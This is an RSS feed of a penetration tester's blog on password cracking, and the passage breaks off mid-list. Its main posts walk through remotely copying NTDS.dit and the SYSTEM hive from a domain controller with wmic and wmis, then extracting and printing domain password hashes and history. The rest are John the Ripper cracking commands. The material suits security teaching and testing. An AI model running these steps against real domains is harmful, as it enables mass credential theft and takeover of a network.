<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Cracking on Room362</title>
    <link>http://room362.com/categories/cracking/</link>
    <description>Recent content in Cracking on Room362</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Tue, 11 Jun 2013 13:55:21 +0000</lastBuildDate>
    <atom:link href="http://room362.com/categories/cracking/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2</title>
      <link>http://room362.com/post/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/</link>
      <pubDate>Tue, 11 Jun 2013 13:55:21 +0000</pubDate>
      
      <guid>http://room362.com/post/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/</guid>
      <description>&lt;p&gt;Part 2, we have the NTDS.dit file and the SYSTEM.hive file. First we need a few tools:&lt;/p&gt;

&lt;p&gt;From: &lt;a href=&#34;http://www.ntdsxtract.com/&#34;&gt;http://www.ntdsxtract.com/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Download: &lt;a href=&#34;http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip&#34;&gt;http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From: &lt;a href=&#34;http://code.google.com/p/libesedb/&#34;&gt;http://code.google.com/p/libesedb/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Download: &lt;a href=&#34;https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz&#34;&gt;https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wget https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Extract the tools:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;tar zxvf libesedb-alpha-20120102.tar.gz
unzip ntdsxtract_v1_0.zip
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Compile/make libesedb:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@wpad:~/blog/# cd libesedb-20120102
root@wpad:~/blog/libesedb-20120102# ./configure 
root@wpad:~/blog/libesedb-20120102# make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Export the tables from NTDS.dit:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@wpad:~/blog/libesedb-20120102# cd esedbtools/
root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport 
esedbexport 20120102
    
Missing source file.
Use esedbexport to export items stored in an Extensible Storage Engine (ESE)
Database (EDB) file

Usage: esedbexport [ -c codepage ] [ -l logfile ] [ -m mode ] [ -t target ]
                   [ -T table_name ] [ -hvV ] source

	source: the source file

	-c:     codepage of ASCII strings, options: ascii, windows-874,
	        windows-932, windows-936, windows-1250, windows-1251,
	        windows-1252 (default), windows-1253, windows-1254
	        windows-1255, windows-1256, windows-1257 or windows-1258
	-h:     shows this help
	-l:     logs information about the exported items
	-m:     export mode, option: all, tables (default)
	        &#39;all&#39; exports all the tables or a single specified table with indexes,
	        &#39;tables&#39; exports all the tables or a single specified table
	-t:     specify the basename of the target directory to export to
	        (default is the source filename) esedbexport will add the suffix
	        .export to the basename
	-T:     exports only a specific table
	-v:     verbose output to stderr
	-V:     print version
root@wpad:~/blog/libesedb-20120102/esedbtools# 


root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport ../../ntds.dit 
esedbexport 20120102

Opening file.
Exporting table 1 (MSysObjects) out of 12.
Exporting table 2 (MSysObjectsShadow) out of 12.
Exporting table 3 (MSysUnicodeFixupVer2) out of 12.
Exporting table 4 (datatable) out of 12.
Exporting table 5 (hiddentable) out of 12.
Exporting table 6 (link_table) out of 12.
Exporting table 7 (sdpropcounttable) out of 12.
Exporting table 8 (sdproptable) out of 12.
Exporting table 9 (sd_table) out of 12.
Exporting table 10 (MSysDefrag2) out of 12.
Exporting table 11 (quota_table) out of 12.
Exporting table 12 (quota_rebuild_progress_table) out of 12.
Export completed.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Move the exported tables to somewhere a bit easier:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# 
root@wpad:~/blog/libesedb-20120102/esedbtools# mv ntds.dit.export/ ../../
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;NTDS extract can do a lot more than just hashes:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@wpad:~/blog# cd NTDSXtract 1.0/
root@wpad:~/blog/NTDSXtract 1.0# ls
dscomputers.py  dsdeletedobjects.py  dsfileinformation.py  dsgroups.py  dstimeline.py  dsusers.py  framework  ntds
root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py 
DSUsers
Extracts information related to user objects

usage: dsusers.py   [option]
  options:
    --rid 
          List user identified by RID
    --name 
          List user identified by Name
    --passwordhashes 
          Extract password hashes
    --passwordhistory 
          Extract password history
    --certificates
          Extract certificates
    --supplcreds 
          Extract kerberos keys
    --membership
          List groups of which the user is a member
root@wpad:~/blog/NTDSXtract 1.0# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But we like hashes:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes ../SYSTEM.hive --passwordhistory ../SYSTEM.hive 
Running with options:
	Extracting password hashes
	Extracting password history
Initialising engine...
Scanning database - 100% -&amp;gt; 3475 records processed
Extracting schema information - 100% -&amp;gt; 1549 records processed
Extracting object links...

List of users:
==============

Record ID:           3562
User name:           Administrator
User principal name: 
SAM Account name:    Administrator
SAM Account type:    SAM_NORMAL_USER_ACCOUNT
GUID: 7ceee337-fa58-4ca0-9643-540a40161020
SID:  S-1-5-21-3825330677-773554443-1603823854-500
When created:         2012-08-22 03:12:59
When changed:         2013-05-15 04:06:55
Account expires:      Never
Password last set:    2012-08-22 02:49:42.899576
Last logon:           2013-05-15 04:08:04.547236
Last logon timestamp: 2013-05-15 04:06:55.577353
Bad password time     2013-06-07 02:34:34.560516
Logon count:          9
Bad password count:   1
User Account Control:
	NORMAL_ACCOUNT
Ancestors:
	$ROOT_OBJECT$ net projectmentor Users Administrator 
Password hashes:
	Administrator:$NT$88e4d9fabaecf3ded18dd80905521b29:::
Password history:

Record ID:           3563
User name:           Guest
User principal name: 
SAM Account name:    Guest
SAM Account type:    SAM_NORMAL_USER_ACCOUNT
GUID: 659723d7-1246-4959-b0fc-af80ea5e3816
SID:  S-1-5-21-3825330677-773554443-1603823854-501
When created:         2012-08-22 03:12:59
When changed:         2013-03-14 06:54:22
Account expires:      Never
Password last set:    2013-03-14 06:54:22.029303
Last logon:           2013-03-14 06:54:27.012817
Last logon timestamp: 2013-03-14 06:32:41.834022
Bad password time     2013-06-07 03:07:46.499917
Logon count:          0
Bad password count:   10
User Account Control:
	PWD Not Required
	NORMAL_ACCOUNT
	PWD Never Expires
Ancestors:
	$ROOT_OBJECT$ net projectmentor Users Guest 
Password hashes:
	Guest:$NT$823893adfad2ada6e1a414f3ebdf58f7:::
Password history:

Record ID:           3564
User name:           user
User principal name: 
SAM Account name:    user
SAM Account type:    SAM_NORMAL_USER_ACCOUNT
GUID: c5a5c87a-93b4-4d80-97a1-1c605b9b0c03
SID:  S-1-5-21-3825330677-773554443-1603823854-1000
When created:         2012-08-22 03:12:59
When changed:         2013-06-07 02:51:54
Account expires:      Never
Password last set:    2013-03-14 03:25:11.793912
Last logon:           2013-06-07 02:51:54.152191
Last logon timestamp: 2013-06-07 02:51:54.152191
Bad password time     2013-04-19 05:25:40.412670
Logon count:          67
Bad password count:   0
User Account Control:
	NORMAL_ACCOUNT
	PWD Never Expires
Ancestors:
	$ROOT_OBJECT$ net projectmentor Users user 
Password hashes:
	user:$NT$88e4d9fabaecf3dec18dd80905521b29:::
Password history:
	user_nthistory0:$NT$88e4d9fabafcf3dec18dd80905521b29:::
	user_nthistory1:$NT$0c61031f010b2fbb88fe449fbf262477:::
	user_nthistory2:$NT$88e4dffabaecf3dec18dd80905521b29:::
	user_lmhistory0:c869027e01c3c4fe7626a90c87cc7fed:::
	user_lmhistory1:8be023cd858da1edd21b94907afe182c:::

Record ID:           3610
User name:           krbtgt
User principal name: 
SAM Account name:    krbtgt
SAM Account type:    SAM_NORMAL_USER_ACCOUNT
GUID: 74e6bd0b-e4d5-42df-98d5-24f9060061c9
SID:  S-1-5-21-3825330677-773554443-1603823854-502
When created:         2012-08-22 03:16:03
When changed:         2012-08-22 03:31:13
Account expires:      Never
Password last set:    2012-08-22 03:16:03.166457
Last logon:           Never
Last logon timestamp: Never
Bad password time     Never
Logon count:          0
Bad password count:   0
User Account Control:
	Disabled
	NORMAL_ACCOUNT
Ancestors:
	$ROOT_OBJECT$ net projectmentor Users krbtgt 
Password hashes:
	krbtgt:$NT$7253e8647254716b507a2dcb149ff2da:::
Password history:
	krbtgt_nthistory0:$NT$7253e86a7254716a507a2dcb149ff2da:::
	krbtgt_lmhistory0:113926e06a31d182623633041b632929:::

Record ID:           3762
User name:           John Doe
User principal name: jdoe@projectmentor.net
SAM Account name:    jdoe
SAM Account type:    SAM_NORMAL_USER_ACCOUNT
GUID: bbf24c63-39a9-4cc4-8aa8-933f9ddee940
SID:  S-1-5-21-3825330677-773554443-1603823854-1104
When created:         2012-08-22 04:10:52
When changed:         2013-06-05 13:04:11
Account expires:      Never
Password last set:    2013-04-19 07:11:49.849592
Last logon:           2013-06-07 02:56:25.677855
Last logon timestamp: 2013-06-05 13:04:11.674344
Bad password time     2013-05-02 03:01:12.536251
Logon count:          242
Bad password count:   0
User Account Control:
	NORMAL_ACCOUNT
	PWD Never Expires
Ancestors:
	$ROOT_OBJECT$ net projectmentor Users John Doe 
Password hashes:
	John Doe:$NT$88e4d9fabaecf3ded18dd80905511b29:::
Password history:

Record ID:           3797
User name:           Random User
User principal name: randy@projectmentor.net
SAM Account name:    randy
SAM Account type:    SAM_NORMAL_USER_ACCOUNT
GUID: 2701eb29-628a-4568-a093-d33a7db10d04
SID:  S-1-5-21-3825330677-773554443-1603823854-1108
When created:         2013-04-08 02:34:04
When changed:         2013-05-27 16:06:07
Account expires:      Never
Password last set:    2013-04-19 06:59:25.423280
Last logon:           2013-04-08 02:34:10.482690
Last logon timestamp: 2013-04-08 02:34:10.482690
Bad password time     Never
Logon count:          1
Bad password count:   0
User Account Control:
	NORMAL_ACCOUNT
	PWD Never Expires
Ancestors:
	$ROOT_OBJECT$ net projectmentor Users Random User 
Password hashes:
	Random User:$NT$88ead9fa5aecf3dec18dd80905521b29:::
Password history:
root@wpad:~/blog/NTDSXtract 1.0# 

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All done. Start crackin&amp;rsquo;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1</title>
      <link>http://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/</link>
      <pubDate>Mon, 10 Jun 2013 13:11:03 +0000</pubDate>
      
      <guid>http://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;This and part 2 are mostly just an update to &lt;a href=&#34;http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html&#34;&gt;http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html&lt;/a&gt; but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ever run into a Domain Controller that wasn&amp;rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start&lt;/p&gt;

&lt;p&gt;First authenticate to the domain controller and make sure you have a good working directory to use.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;net use \\DC1 /user:DOMAIN\domainadminsvc domainadminsvc123
dir \\DC1\C$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alright, lets say &amp;ldquo;TEMP&amp;rdquo; is there and it&amp;rsquo;s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in &lt;code&gt;C:\TEMP&lt;/code&gt; where we already made sure is clear.&lt;/p&gt;

&lt;p&gt;We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory&amp;rsquo;s DB much like Window&amp;rsquo;s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.&lt;/p&gt;

&lt;p&gt;So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you&amp;rsquo;ve installed wmic for Linux via &lt;a href=&#34;http://www.krenger.ch/blog/wmi-commands-from-linux/&#34;&gt;http://www.krenger.ch/blog/wmi-commands-from-linux/&lt;/a&gt; ) - this &lt;em&gt;IS&lt;/em&gt; an interactive command so this won&amp;rsquo;t work very nicely in a Meterpreter shell:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c vssadmin list shadows 2&amp;gt;&amp;amp;1 &amp;gt; C:\tempoutput.txt&amp;quot;
Executing (Win32_Process)-&amp;gt;Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 7304;
        ReturnValue = 0;
};
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To break down this command:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;wmic /node:DC1&lt;/code&gt; - tells it to interact with the WMI API on DC1&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/user:DOMAIN\domainadminsvc /password:domainadminsvc123&lt;/code&gt; - authentication&lt;/li&gt;
&lt;li&gt;&lt;code&gt;process call create&lt;/code&gt; - WMI speak for create a process&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cmd /c&lt;/code&gt; - vssadmin doesn&amp;rsquo;t operate outside of cmd for some reason&amp;hellip;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vssadmin list shadows&lt;/code&gt; - List any shadow volumes that already exist&lt;/li&gt;
&lt;li&gt;&lt;code&gt;2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&lt;/code&gt; - Take STDIN and STDERROR and throw it in a text file on DC1 C:\TEMP. Make sure you specify full path because you will be executing from within C:\Windows\System32 and its a pain to find anything in that directory. So if you just specify &amp;gt; bob.txt you get to hunt in C:\Windows\System32 or wherever WMI wants to execute you from for bob.txt&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Process starts and then you need to view the output file by either copying it down, &lt;code&gt;type \DC1\C$\TEMP\output.txt&lt;/code&gt; or mount the C drive as a network share. Either way you should either see something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;type output.txt
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2005 Microsoft Corp.

Contents of shadow copy set ID: {671090fd-0198}
   Contained 1 shadow copies at creation time: 5/31/2013 11:29:03 AM
      Shadow Copy ID: {0863e309}
         Original Volume: (C:)\\?\Volume{c44da10e-0154-11e1-b968-806e6f6e6963}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: wpad
         Service Machine: wpad
         Provider: &#39;Microsoft Software Shadow Copy provider 1.0&#39;
         Type: ClientAccessibleWriters
         Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;or&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;type output.txt
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2005 Microsoft Corp.

No items found that satisfy the query
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &amp;lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don&amp;rsquo;t have to remember this):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c vssadmin create shadow /for=C: 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The other thing to keep in mind is that NTDS.dit isn&amp;rsquo;t always on the main drive. It is commonly on a &amp;ldquo;D&amp;rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)&lt;/p&gt;

&lt;p&gt;Next we just copy the files out of the shadow copies. First the SYSTEM hive:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM.hive 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then the NTDS.dit (notice this one isn&amp;rsquo;t in System32):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In Kali Linux you could use the WMIS package to do much the same thing:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //DC1 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt
NTSTATUS: NT_STATUS_OK - Success
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Copy those files to your own system for offline extraction which I&amp;rsquo;ll cover in part 2.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Length Sorting Wordlists</title>
      <link>http://room362.com/post/2013/2013-03-18-length-sorting-wordlists/</link>
      <pubDate>Mon, 18 Mar 2013 20:01:44 +0000</pubDate>
      
      <guid>http://room362.com/post/2013/2013-03-18-length-sorting-wordlists/</guid>
      <description>&lt;p&gt;This is one of those stupid simple things that are easy to forget so I&amp;rsquo;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&amp;rsquo;t have to, but there is times where it&amp;rsquo;s important.&lt;/p&gt;

&lt;p&gt;Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&amp;rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits. However, if you start throwing rules into the mix that equation changes. If you have &amp;ldquo;iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&amp;rdquo; on the 3rd line of your dictionary, testing every possible permutation where you replace an &amp;lsquo;i&amp;rsquo; with a 1 is going to take a very long time.&lt;/p&gt;

&lt;p&gt;Both Hashcat and John deal with this by limiting the length where permutations occur. (HC/JTR peeps please correct me if I&amp;rsquo;m wrong). Cain on the other hand, will try every possibility and hang on the 3rd line for years (over exagerated). How do you solve that? Easy, remove any word over a certain length. While that does work, and very similar to what the HC/JTR do, I don&amp;rsquo;t like loosing words from my dictionary, so I tend to sort them by length. That way, all the nasty ones are near the end and I can scale back the rules on them.&lt;/p&gt;

&lt;p&gt;To do that is very simple:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;awk &#39;{print length, $0}&#39; rockyou.txt | sort -n | cut -d &amp;quot; &amp;quot; -f2- &amp;gt; rockyou_ls.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats it. Basic, simple and stored here for reference.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Intro to White Chapel</title>
      <link>http://room362.com/post/2013/2013-01-19-intro-to-white-chapel/</link>
      <pubDate>Sat, 19 Jan 2013 02:50:08 +0000</pubDate>
      
      <guid>http://room362.com/post/2013/2013-01-19-intro-to-white-chapel/</guid>
      <description>&lt;p&gt;I made a slide deck to kind of explain my latest project. Basically I got fed up with having dictionaries, passwords, and cracking tools but no way to really do better collaboration in a team format as well as just better management for myself. &lt;/p&gt;

&lt;p&gt;Please feel free to submit pull requests, issues if you think something is broken or want features, or whatever on the Github repo here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/WhiteChapel/&#34;&gt;https://github.com/mubix/WhiteChapel/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here is the slide deck:&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&#34;http://www.slideshare.net/slideshow/embed_code/16064224&#34; width=&#34;427&#34; height=&#34;356&#34; frameborder=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; scrolling=&#34;no&#34; style=&#34;border:1px solid #CCC;border-width:1px 1px 0;margin-bottom:5px&#34; allowfullscreen&gt; &lt;/iframe&gt; &lt;div style=&#34;margin-bottom:5px&#34;&gt; &lt;strong&gt; &lt;a href=&#34;https://www.slideshare.net/mubix/intro-to-white-chapel&#34; title=&#34;Intro to White Chapel&#34; target=&#34;_blank&#34;&gt;Intro to White Chapel&lt;/a&gt; &lt;/strong&gt; from &lt;strong&gt;&lt;a href=&#34;http://www.slideshare.net/mubix&#34; target=&#34;_blank&#34;&gt;Rob Fuller&lt;/a&gt;&lt;/strong&gt; &lt;/div&gt;&lt;/p&gt;

&lt;p&gt;slideshare 16064224&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>lm2ntlm with John the Ripper</title>
      <link>http://room362.com/post/2012/2012-10-24-lm2ntlm-with-john-the-ripper/</link>
      <pubDate>Wed, 24 Oct 2012 15:03:58 +0000</pubDate>
      
      <guid>http://room362.com/post/2012/2012-10-24-lm2ntlm-with-john-the-ripper/</guid>
      <description>&lt;p&gt;Since I didn&amp;rsquo;t see any documentation bringing how to take an LM hash that you&amp;rsquo;ve cracked and convert it to the NTLM equivalent all in one place. And I google how to do it almost every time. I wanted to put all these links in one place and remember how to do it for john. Go-go-gadget blog-notes.&lt;/p&gt;

&lt;p&gt;So there is this: &lt;a href=&#34;https://github.com/snarez/rcracki/blob/master/lm2ntlm.cpp&#34;&gt;https://github.com/snarez/rcracki/blob/master/lm2ntlm.cpp&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And this: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/tools/lm2ntcrack.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/tools/lm2ntcrack.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And this: &lt;a href=&#34;http://www.securityfocus.com/tools/6696&#34;&gt;http://www.securityfocus.com/tools/6696&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And the edited version of the above: &lt;a href=&#34;http://atenlabs.com/blog/so-you-pillaged-a-domain-controllers-hashes/&#34;&gt;http://atenlabs.com/blog/so-you-pillaged-a-domain-controllers-hashes/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But Metasploit&amp;rsquo;s is currently &lt;a href=&#34;http://dev.metasploit.com/redmine/issues/7351&#34;&gt;borked&lt;/a&gt;,(&lt;strong&gt;Update: this is now fixed&lt;/strong&gt;) I don&amp;rsquo;t want to compile cpp, and perl sucks. One thing I did find was that someone submitted it to the JtR dev mailing list here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2011/03/29/7&#34;&gt;http://www.openwall.com/lists/john-dev/2011/03/29/7&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And I asked on that same list what had become of it:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2012/10/24/2&#34;&gt;http://www.openwall.com/lists/john-dev/2012/10/24/2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The result is as follows:&lt;/p&gt;

&lt;p&gt;Given this hash:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Administrator:500:AA1AB12D9BE8C0D18F900ABF62624751:A2855453E8F6E555E5F22956F7DAA398:::
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;which is the LM and NTLM equiv of SUPERPASSWORD/SuPerPaSsWord respectively. So just so I don&amp;rsquo;t have to make a screen shot of a text file assume that hash exactly as-is is in pwdump.txt.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_lm2ntlm_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;cracked the LM side in 16 seconds. Now you don&amp;rsquo;t need to use John to get the LM side (rainbow tables work better at times),&lt;/p&gt;

&lt;p&gt;Solar Designer (JtR&amp;rsquo;s main dev) suggested the following path:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_lm2ntlm_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;A bit hard to read but here are the commands:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./john -show pwdump.txt | cut -d: -f2 &amp;gt; cracked      
./john -w=cracked -rules:nt -format=nt pwdump.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see (if you squint) that works well. Rich Rumble suggested:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2012/10/24/3&#34;&gt;http://www.openwall.com/lists/john-dev/2012/10/24/3&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;using the loopback as so: &lt;code&gt;./john pwdump.txt -format=nt -loopback=john.pot -rules=nt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The loopback been an amazing addition that is as Solar Designer put it &amp;ldquo;not in core JtR, it is a fairly recent addition to jumbo&amp;rdquo;. The loopback allows you to use previously cracked passwords as a dictionary without doing any cut/awk/sed voodoo. The problem with the suggested method for going from LM to NTLM and the loopback option is that it (rightly so) identifies LM hashes by their halves. When it tries to use those halves to crack the NTLM, every with the NT rule-set, it sees each half as separate passwords to try, so it fails.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Multiple Dictionaries or Wordlists Using John the Ripper</title>
      <link>http://room362.com/post/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/</link>
      <pubDate>Mon, 12 Sep 2011 08:09:46 +0000</pubDate>
      
      <guid>http://room362.com/post/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/</guid>
      <description>&lt;p&gt;John the ripper only takes one word list at a time. There are plenty of docs out there that show you how to cat all of your dictionaries into John&amp;rsquo;s stdin function but I like to run rules against my lists and I didn&amp;rsquo;t see any how-tos on doing this. Here is my way:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ls dicts | xargs -t -I file ./john --pot=victim.pot --format=mscash --wordlist=dicts/file --rules victim_cachedump.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This command will ls the &amp;lsquo;dicts&amp;rsquo; directory, pipe it to xargs, which will spit out the command it uses for each itteration (-t) and replace every time it see the word file with the line/itteration its on (-I). Then it&amp;rsquo;s just your standard john arguments.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>GPU Cracking Complaints</title>
      <link>http://room362.com/post/2011/2011-07-13-gpu-cracking-complaints/</link>
      <pubDate>Wed, 13 Jul 2011 14:02:13 +0000</pubDate>
      
      <guid>http://room362.com/post/2011/2011-07-13-gpu-cracking-complaints/</guid>
      <description>&lt;p&gt;I&amp;rsquo;ve been cracking passwords for a while and use a myriad of tools in a certain order to get the job done. I find that Cain is still my Go-to for allowing me to visualize the process and do some basic sorting (really wish I could search in-app). But I&amp;rsquo;ve been asking around on twitter some questions like Why is GPU cracking for 50k hashes faster than Rainbow Tables (most say the bottleneck is the HDD read style and speed) and many asked what all of my compalints are so I figured this would be the best place (vice multiple emails)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;DISCLAIMER&lt;/strong&gt;: I have very little crypto knowledge and even less GPU programming knowledge so I only get to complain as a user and not as someone who can actually fix the things I complain about.&lt;/p&gt;

&lt;ol&gt;
